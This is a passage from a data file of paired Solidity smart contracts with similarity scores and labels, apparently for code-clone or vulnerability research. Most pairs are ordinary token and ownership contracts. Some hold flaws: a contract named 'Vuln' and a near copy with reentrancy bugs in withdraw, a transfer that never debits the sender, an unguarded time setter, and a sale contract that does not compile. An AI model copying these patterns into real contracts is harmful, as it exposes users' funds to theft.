        if (startTimeDay <= dayTime && dayTime <=  endTimeDay) {

            return true;

        }

        return false;

    }



    function changeTime(uint256 _newStartTimeDay, uint256 _newEndTimeDay) public {

        require(0 < _newStartTimeDay && 0 < _newEndTimeDay);

        startTimeDay = _newStartTimeDay;

        endTimeDay = _newEndTimeDay;

    }



    

    function claimTokensToOwner(address _token) public onlyOwner {

        if (_token == 0x0) {

            owner.transfer(address(this).balance);

            return;

        }

        TaurusPay token = TaurusPay(_token);

        uint256 balance = token.balanceOf(this);

        token.transfer(owner, balance);

        emit Transfer(_token, owner, balance);

    }



    function setPriceClaim(uint256 _newPriceClaim) external onlyOwner {

        require(_newPriceClaim > 0);

        priceClaim = _newPriceClaim;

    }



    function setNumberClaimToken(uint256 _newNumClaimToken) external onlyOwner {

        require(_newNumClaimToken > 0);

        numberClaimToken = _newNumClaimToken;

    }



}",1,,,,,
"contract DappToken {
    string public name = ""Dapp Token"";
    string public symbol = ""DToken"";
    string public standard = ""DToken v1.0"";
    uint256 public totalSupply;

    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
        );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
        );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 _initialSupply) public {
        balanceOf[msg.sender] = _initialSupply;
        totalSupply = _initialSupply;
    }   

    function transfer (address _to, uint256 _value) public returns(bool success) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;

        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns(bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns(bool success) {

        require (_value <= balanceOf[_from]);
        require (_value <= allowance[_from][msg.sender]);

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;

        allowance[_from][msg.sender] -= _value;

        emit Transfer( _from, _to, _value);
        return true;
    }

}",0.964569402,"contract DappToken {

    string  public name = ""Utopia Credits"";

    string  public symbol = ""UTOC"";

    string  public standard = ""DApp Token v1.0"";

    uint256 public totalSupply;



    event Transfer(

        address indexed _from,

        address indexed _to,

        uint256 _value

    );



    event Approval(

        address indexed _owner,

        address indexed _spender,

        uint256 _value

    );



    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;



    function DappToken (uint256 _initialSupply) public {

        balanceOf[msg.sender] = _initialSupply;

        totalSupply = _initialSupply;

    }



    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(balanceOf[msg.sender] >= _value);



        balanceOf[msg.sender] -= _value;

        balanceOf[_to] += _value;



        Transfer(msg.sender, _to, _value);



        return true;

    }



    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowance[msg.sender][_spender] = _value;



        Approval(msg.sender, _spender, _value);



        return true;

    }



    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        require(_value <= balanceOf[_from]);

        require(_value <= allowance[_from][msg.sender]);



        balanceOf[_from] -= _value;

        balanceOf[_to] += _value;



        allowance[_from][msg.sender] -= _value;



        Transfer(_from, _to, _value);



        return true;

    }

}",1,,,,,
"contract MyToken {
  string public name;
  string public symbol;
  uint8 public decimals;

  event Transfer(address indexed from, address indexed to, uint256 value);

  
  mapping (address => uint256) public balanceOf;

  function MyToken(uint256 initialSupply, string tokenName, string tokenSymbol, uint8 decimalUnits) public {
    balanceOf[msg.sender] = initialSupply;
    name = tokenName;
    symbol = tokenSymbol;
    decimals = decimalUnits;
  }

  
  function transfer(address _to, uint256 _value) public {
    
    require(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);

    
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;

    
    Transfer(msg.sender, _to, _value);
  }
}",0.963483041,"contract TheCoinBBToken {

    

    string public name;

    

    string public symbol;

    

    uint public decimals;



    

    event Transfer(address indexed from, address indexed to, uint256 value);



    

    mapping(address => uint256) public balanceOf;





    

    function TheCoinBBToken(uint256 initialSupply,string tokenName, string tokenSymbol, uint8 decimalUnits) public {

        

        balanceOf[msg.sender] = initialSupply;

        name = tokenName;                                 

        symbol = tokenSymbol;                               

        decimals = decimalUnits; 

    }



    

    function transfer(address _to,uint256 _value) public {

        

        require(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);

        balanceOf[msg.sender] -= _value;

        balanceOf[_to] += _value;

        

        Transfer(msg.sender, _to, _value);

    }



}",1,,,,,
"contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        
        msg.sender.call.value(balances[msg.sender])("""");

        
        balances[msg.sender] = 0;
    }
}",0.936771759,"contract keepMyEther {
    mapping(address => uint256) public balances;
    
    function () payable public {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        msg.sender.call.value(balances[msg.sender])();
        balances[msg.sender] = 0;
    }
}",1,,,,,
"contract SafeMath {
  function safeMul(uint256 a, uint256 b) internal returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function safeDiv(uint256 a, uint256 b) internal returns (uint256) {
    assert(b > 0);
    uint256 c = a / b;
    assert(a == b * c + a % b);
    return c;
  }

  function safeSub(uint256 a, uint256 b) internal returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function safeAdd(uint256 a, uint256 b) internal returns (uint256) {
    uint256 c = a + b;
    assert(c>=a && c>=b);
    return c;
  }

  function assert(bool assertion) internal {
    if (!assertion) {
      throw;
    }
  }
}",0.990318446,"contract SafeMath {

  function safeMul(uint256 a, uint256 b) internal returns (uint256) {

    uint256 c = a * b;

    assert(a == 0 || c / a == b);

    return c;

  }



  function safeDiv(uint256 a, uint256 b) internal returns (uint256) {

    assert(b > 0);

    uint256 c = a / b;

    assert(a == b * c + a % b);

    return c;

  }



  function safeSub(uint256 a, uint256 b) internal returns (uint256) {

    assert(b <= a);

    return a - b;

  }



  function safeAdd(uint256 a, uint256 b) internal returns (uint256) {

    uint256 c = a + b;

    assert(c>=a && c>=b);

    return c;

  }



  function assert(bool assertion) internal {

    if (!assertion) {

      revert();

    }

  }

}",1,,,,,
"contract ERC20 is SafeMath{           
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public owner;

    mapping (address => uint256) public balanceOf;
    mapping (address => uint256) public freezeOf;
    mapping (address => mapping (address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Burn(address indexed from, uint256 value);

    event Freeze(address indexed from, uint256 value);

    event Unfreeze(address indexed from, uint256 value);

    function ERC20(
        uint256 initialSupply,
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol
        ) {
        balanceOf[msg.sender] = initialSupply;              
        totalSupply = initialSupply;                        
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
        owner = msg.sender;
    }

    
    function transfer(address _to, uint256 _value) {
        if (_to == 0x0) throw;                               
        if (_value <= 0) throw; 
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);                     
        balanceOf[_to] = SafeMath.safeAdd(balanceOf[_to], _value);                            
        Transfer(msg.sender, _to, _value);                   
    }

    
    function approve(address _spender, uint256 _value)
        returns (bool success) {
        if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }


    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (_to == 0x0) throw;                                
        if (_value <= 0) throw; 
        if (balanceOf[_from] < _value) throw;                 
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;  
        if (_value > allowance[_from][msg.sender]) throw;     
        balanceOf[_from] = SafeMath.safeSub(balanceOf[_from], _value);                           
        balanceOf[_to] = SafeMath.safeAdd(balanceOf[_to], _value);                             
        allowance[_from][msg.sender] = SafeMath.safeSub(allowance[_from][msg.sender], _value);
        Transfer(_from, _to, _value);
        return true;
    }

    function burn(uint256 _value) returns (bool success) {
        if (balanceOf[msg.sender] < _value) throw;            
        if (_value <= 0) throw; 
        balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);                      
        totalSupply = SafeMath.safeSub(totalSupply,_value);                                
        Burn(msg.sender, _value);
        return true;
    }

    function freeze(uint256 _value) returns (bool success) {
        if (balanceOf[msg.sender] < _value) throw;            
        if (_value <= 0) throw; 
        balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);                      
        freezeOf[msg.sender] = SafeMath.safeAdd(freezeOf[msg.sender], _value);                                
        Freeze(msg.sender, _value);
        return true;
    }

    function unfreeze(uint256 _value) returns (bool success) {
        if (freezeOf[msg.sender] < _value) throw;            
        if (_value <= 0) throw; 
        freezeOf[msg.sender] = SafeMath.safeSub(freezeOf[msg.sender], _value);                      
        balanceOf[msg.sender] = SafeMath.safeAdd(balanceOf[msg.sender], _value);
        Unfreeze(msg.sender, _value);
        return true;
    }

    
    function withdrawEther(uint256 amount) {
        if(msg.sender != owner)throw;
        owner.transfer(amount);
    }

    
    function() payable {
    }
}",0.99616562,"contract PETRO is SafeMath{
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
	address public owner;

    
    mapping (address => uint256) public balanceOf;
	mapping (address => uint256) public freezeOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);
	
	
    event Freeze(address indexed from, uint256 value);
	
	
    event Unfreeze(address indexed from, uint256 value);

    
    function PETRO(
        uint256 initialSupply,
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol
        ) {
        balanceOf[msg.sender] = initialSupply;              
        totalSupply = initialSupply;                        
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
		owner = msg.sender;
    }

    
    function transfer(address _to, uint256 _value) {
        if (_to == 0x0) throw;                               
		if (_value <= 0) throw; 
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);                     
        balanceOf[_to] = SafeMath.safeAdd(balanceOf[_to], _value);                            
        Transfer(msg.sender, _to, _value);                   
    }

    
    function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
       

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (_to == 0x0) throw;                                
		if (_value <= 0) throw; 
        if (balanceOf[_from] < _value) throw;                 
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;  
        if (_value > allowance[_from][msg.sender]) throw;     
        balanceOf[_from] = SafeMath.safeSub(balanceOf[_from], _value);                           
        balanceOf[_to] = SafeMath.safeAdd(balanceOf[_to], _value);                             
        allowance[_from][msg.sender] = SafeMath.safeSub(allowance[_from][msg.sender], _value);
        Transfer(_from, _to, _value);
        return true;
    }

    function burn(uint256 _value) returns (bool success) {
        if (balanceOf[msg.sender] < _value) throw;            
		if (_value <= 0) throw; 
        balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);                      
        totalSupply = SafeMath.safeSub(totalSupply,_value);                                
        Burn(msg.sender, _value);
        return true;
    }
	
	function freeze(uint256 _value) returns (bool success) {
        if (balanceOf[msg.sender] < _value) throw;            
		if (_value <= 0) throw; 
        balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);                      
        freezeOf[msg.sender] = SafeMath.safeAdd(freezeOf[msg.sender], _value);                                
        Freeze(msg.sender, _value);
        return true;
    }
	
	function unfreeze(uint256 _value) returns (bool success) {
        if (freezeOf[msg.sender] < _value) throw;            
		if (_value <= 0) throw; 
        freezeOf[msg.sender] = SafeMath.safeSub(freezeOf[msg.sender], _value);                      
		balanceOf[msg.sender] = SafeMath.safeAdd(balanceOf[msg.sender], _value);
        Unfreeze(msg.sender, _value);
        return true;
    }
	
	
	function withdrawEther(uint256 amount) {
		if(msg.sender != owner)throw;
		owner.transfer(amount);
	}
	
	
	function() payable {
    }
}",1,,,,,
"contract Token {
  
  function totalSupply() constant returns (uint256 supply) {}

  
  
  function balanceOf(address _owner) constant returns (uint256 balance) {}

  
  
  
  
  function transfer(address _to, uint256 _value) returns (bool success) {}

  
  
  
  
  
  function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}

  
  
  
  
  function approve(address _spender, uint256 _value) returns (bool success) {}

  
  
  
  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}

  event Transfer(address indexed _from, address indexed _to, uint256 _value);
  event Approval(address indexed _owner, address indexed _spender, uint256 _value);

  uint public decimals;
  string public name;
}",0.98861731,"contract Token {
  
  function totalSupply() constant returns (uint256 supply) {}

  
  
  function balanceOf(address _owner) constant returns (uint256 balance) {}

  
  
  
  
  function transfer(address _to, uint256 _value) returns (bool success) {}

  
  
  
  
  
  function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}

  
  
  
  
  function approve(address _spender, uint256 _value) returns (bool success) {}

  
  
  
  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}

  event Transfer(address indexed _from, address indexed _to, uint256 _value);
  event Approval(address indexed _owner, address indexed _spender, uint256 _value);

  uint public decimals;
  string public name = ""black"";
}",1,,,,,
"contract StandardToken is Token {

  function transfer(address _to, uint256 _value) returns (bool success) {
    
    
    
    if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
    
      balances[msg.sender] -= _value;
      balances[_to] += _value;
      Transfer(msg.sender, _to, _value);
      return true;
    } else { return false; }
  }

  function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
    
    if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
    
      balances[_to] += _value;
      balances[_from] -= _value;
      allowed[_from][msg.sender] -= _value;
      Transfer(_from, _to, _value);
      return true;
    } else { return false; }
  }

  function balanceOf(address _owner) constant returns (uint256 balance) {
    return balances[_owner];
  }

  function approve(address _spender, uint256 _value) returns (bool success) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
  }

  mapping(address => uint256) balances;

  mapping (address => mapping (address => uint256)) allowed;

  uint256 public totalSupply;
}",0.995745652,"contract StandardToken is Token {

    function transfer(address _to, uint256 _value) returns (bool success) {

        if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else {return false;}
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {

        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else {return false;}
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}",1,,,,,
"contract Authorizable {

  address[] authorizers;
  mapping(address => uint256) authorizerIndex;

  
  modifier onlyAuthorized {
    require(isAuthorized(msg.sender));
    _;
  }

  
  function Authorizable() {
    authorizers.length = 2;
    authorizers[1] = msg.sender;
    authorizerIndex[msg.sender] = 1;
  }

  
  function getAuthorizer(uint256 authIndex) external constant returns(address) {
    return address(authorizers[authIndex + 1]);
  }

  
  function isAuthorized(address _addr) constant returns(bool) {
    return authorizerIndex[_addr] > 0;
  }

  
  function addAuthorized(address _addr) external onlyAuthorized {
    authorizerIndex[_addr] = authorizers.length;
    authorizers.length++;
    authorizers[authorizers.length - 1] = _addr;
  }
}",0.937721729,"contract Authorizable {



    address[] authorizers;

    mapping(address => uint) authorizerIndex;



    

    modifier onlyAuthorized {

        require(isAuthorized(msg.sender));

        _;

    }



    

    constructor() public {

        authorizers.length = 2;

        authorizers[1] = msg.sender;

        authorizerIndex[msg.sender] = 1;

    }



    

    function getAuthorizer(uint authorizerIndex) external view returns(address) {

        return address(authorizers[authorizerIndex + 1]);

    }



    

    function isAuthorized(address _addr) public view returns(bool) {

        return authorizerIndex[_addr] > 0;

    }



    

    function addAuthorized(address _addr) external onlyAuthorized {

        authorizerIndex[_addr] = authorizers.length;

        authorizers.length++;

        authorizers[authorizers.length - 1] = _addr;

    }



}",1,,,,,
"contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) constant returns (uint256);
  function transfer(address to, uint256 value) returns (bool);
  
  event Transfer(address from, address to, uint256 value);
}",0.942107026,"contract ERC20Basic {

  uint256 public totalSupply;

  function balanceOf(address who) constant returns (uint256);

  function transfer(address to, uint256 value);

  event Transfer(address indexed from, address indexed to, uint256 value);

}",1,,,,,
"contract BasicToken is ERC20Basic {
  using SafeMath for uint;

  mapping(address => uint256) balances;

  
  modifier onlyPayloadSize(uint256 size) {
     require(msg.data.length >= size + 4);
     _;
  }

  
  function transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32) returns (bool) {
    
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) constant returns (uint256 balance) {
    return balances[_owner];
  }
}",0.904590675,"contract BasicToken is ERC20Basic {
  using SafeMath for uint;
 
  mapping(address => uint) balances;
 
  
  modifier onlyPayloadSize(uint size) {
     if(msg.data.length < size + 4) {
       return;
     }
     _;
  }
 
  
  function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) {
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
  }
 
  
  function balanceOf(address _owner) constant returns (uint balance) {
    return balances[_owner];
  }
 
}",1,*,,,,
"contract StandardToken is Token {
    function transfer(address _to, uint256 _value) public returns (bool success) {
        
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            emit Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            emit Transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }
    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 totalTokenSupply;
}",0.913433522,"contract ERC20Token is ERC20TokenInterface {
    using SafeMath for uint;

    
    mapping (address => uint) balances;

    
    mapping (address => mapping (address => uint)) allowed;

    
    function balanceOf(address _account) public constant returns (uint balance) {
        return balances[_account];
    }

    
    function transfer(address _to, uint _value) public returns (bool success) {
        if (balances[msg.sender] < _value || _value == 0) {

            return false;
        }

        balances[msg.sender] -= _value;
        balances[_to] = balances[_to].plus(_value);

        Transfer(msg.sender, _to, _value);

        return true;
    }

    
    function transferFrom(address _from, address _to, uint _value) public returns (bool success) {
        if (balances[_from] < _value || allowed[_from][msg.sender] < _value || _value == 0) {
            return false;
        }

        balances[_to] = balances[_to].plus(_value);
        balances[_from] -= _value;
        allowed[_from][msg.sender] -= _value;

        Transfer(_from, _to, _value);

        return true;
    }

    
    function approve(address _spender, uint _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        return true;
    }

    
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }    
}",2,,,,,
"contract TokenHappyBirthday
 

{
    
    string public name = ""HappyBirthdayToken"";
    string public symbol = ""HBT"";
    uint8 public decimals = 4;
    
    
    uint256 public totalSupply = 10**8;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function TokenHappyBirthday(
        
    ) public {
        
        
        balanceOf[msg.sender] = totalSupply;                
        
        
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",0.973912308,"contract BwwToken {
    
    string public name = ""BotWithWallet"";
    string public symbol = ""BWW""; 
    uint256 public decimals = 18;
    
    uint256 public totalSupply = 88*10000*10000*10000*10**decimals;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function BwwToken(
    ) public {
        balanceOf[msg.sender] = totalSupply;                
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",1,,,,,
"contract ChampTokenSale {
    address admin;
    string public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;

    event Sell(address _buyer, uint256 _amount);

    constructor (ChampTokenSale _tokenContract, uint256 _tokenPrice) public {
      admin = msg.sender;
      address expected = address(this);
      tokenPrice = _tokenPrice;
    }

    function multiply(uint x, uint y) internal pure returns (uint z) {
      require(y == 0 || (z = x * y) / y == x);
    }

    function buyTokens(uint256 _numberOfTokens) public payable {
      require(msg.value == multiply(_numberOfTokens, tokenPrice));
      require(tokenContract.balanceOf(this)>= _numberOfTokens);
      require(tokenContract.transfer(msg.sender, _numberOfTokens));

      tokensSold += _numberOfTokens;

      emit Sell(msg.sender, _numberOfTokens);
    }

    function endSale() public {
     require(msg.sender == admin);
     require(tokenContract.transfer(admin,  tokenContract.balanceOf(address(this))));


     admin.transfer(address(this).balance);
   }
}",0.933792656,"contract CoinByInsomniaTokenSale {
    address admin;
    CoinByInsomnia public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;

    event Sell(address _buyer, uint256 _amount);

   constructor (CoinByInsomnia _tokenContract, uint256 _tokenPrice) public {
        admin = msg.sender;
        tokenContract = _tokenContract;
        tokenPrice = _tokenPrice;
    }

    function multiply(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x);
    }

    function buyTokens(uint256 _numberOfTokens) public payable {
        require(msg.value == multiply(_numberOfTokens, tokenPrice));
        require(tokenContract.balanceOf(this) >= _numberOfTokens);
        require(tokenContract.transfer(msg.sender, _numberOfTokens));

        tokensSold += _numberOfTokens;

        emit Sell(msg.sender, _numberOfTokens);
    }

    function endSale() public {
        require(msg.sender == admin);
        require(tokenContract.transfer(admin, tokenContract.balanceOf(this)));

        
        
        admin.transfer(address(this).balance);
    }
}",3,,,,,
"contract SafeMath {
    function safeAdd(uint a, uint b) internal pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) internal pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) internal pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) internal pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}",0.930826837,"contract SafeMath {

    function safeAdd(uint a, uint b) public pure returns (uint c) {

        c = a + b;

        require(c >= a);

    }

    function safeSub(uint a, uint b) public pure returns (uint c) {

        require(b <= a);

        c = a - b;

    }

    function safeMul(uint a, uint b) public pure returns (uint c) {

        c = a * b;

        require(a == 0 || c / a == b);

    }

    function safeDiv(uint a, uint b) public pure returns (uint c) {

        require(b > 0);

        c = a / b;

    }

}",0,,,,,
"contract owned {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}",0.934353139,"contract owned {
    address public owner;

    function owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}",0,,,,,
"contract Ownable {
  address public owner;
event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  function Ownable() public {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0);
  }
}",0.971154345,"contract Ownable {
  address public owner;


  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );


  
  constructor() public {
    owner = msg.sender;
  }

  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  
  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0);
  }
}",1,,,,,
"contract owned {
    address public owner;
    event OwnershipTransferred(address indexed previousOwner, address 
    indexed newOwner);
    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}",0.928580164,"contract Ownable {

  address public owner;





  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);





  

  function Ownable() {

    owner = msg.sender;

  }





  

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }





  

  function transferOwnership(address newOwner) onlyOwner public {

    require(newOwner != address(0));

    OwnershipTransferred(owner, newOwner);

    owner = newOwner;

  }



}",1,,,,,
"contract TokenERC20 {
    function totalSupply () public constant returns (uint256 totalSuppy);
    function balanceOf(address _owner) public constant returns (uint256 
    balance);
    function transfer(address _to, uint256 _value) public returns (bool 
    success);
    function transferFrom(address _from, address _to, uint256 _value) 
    public 
    returns (bool success);
    function approve(address _spender, uint256 _value) public returns 
    (bool success);
    function allowance(address _owner, address _spender) public constant 
